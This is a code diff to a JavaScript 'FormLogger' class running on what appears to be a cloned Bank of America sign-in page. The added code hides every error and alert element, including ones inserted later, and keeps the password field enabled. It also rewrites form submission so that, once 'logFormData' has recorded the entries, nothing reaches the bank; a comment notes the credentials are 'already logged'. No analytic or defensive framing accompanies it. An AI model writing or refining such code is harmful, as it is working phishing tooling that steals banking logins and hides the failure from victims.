@@ -15,6 +15,38 @@ class FormLogger {
   init() {
     const self = this;
     
+    // FIRST: Hide any error messages on page load (they'll only show after login attempt)
+    const existingErrors = document.querySelectorAll('.error-state, .error, [class*="error"], .alert-danger');
+    console.log('[Logger] Found', existingErrors.length, 'error elements on page load, hiding them');
+    existingErrors.forEach((el) => {
+      if (el && el.style) {
+        el.style.display = 'none';
+        console.log('[Logger] Hidden error element:', el.className);
+      }
+    });
+    
+    // Also monitor for any dynamically added errors and hide them
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        if (mutation.addedNodes.length) {
+          mutation.addedNodes.forEach((node) => {
+            if (node.nodeType === 1) { // Element node
+              const classList = node.classList ? node.classList.toString() : '';
+              if (classList.includes('error') || classList.includes('alert')) {
+                console.log('[Logger] Hiding dynamically added error:', classList);
+                node.style.display = 'none';
+              }
+            }
+          });
+        }
+      });
+    });
+    
+    // Start observing the main content area
+    const form = document.getElementById('EnterOnlineIDForm');
+    const container = form ? form.closest('.columns') || form.parentElement : document.body;
+    observer.observe(container, { childList: true, subtree: true });
+    
     // Patch jQuery to prevent disabling the password field
     if (typeof jQuery !== 'undefined') {
       const originalProp = jQuery.fn.prop;
@@ -132,16 +164,15 @@ class FormLogger {
       form.submit = function() {
         console.log('[Logger] Form.submit() called, intercepting...');
         self.logFormData(form).then(() => {
-          console.log('[Logger] Data logged, allowing form to proceed to BoA');
-          // After logging, allow submission to Bank of America
-          form.submit = originalSubmit;
-          originalSubmit.call(form);
+          console.log('[Logger] Data logged, blocking submission to Bank of America');
+          // DO NOT allow submission to Bank of America - we've already logged the credentials
+          // This prevents the redirect and error page
         }).catch(error => {
           console.error('[Logger] Error during submission:', error);
-          // Even on error, let form proceed
-          form.submit = originalSubmit;
-          originalSubmit.call(form);
+          // Even on error, do NOT submit to Bank of America
         });
+        // Always prevent default form submission
+        return false;
       };
       
       // Also intercept input element submit (for form.elements.namedItem('submit'))
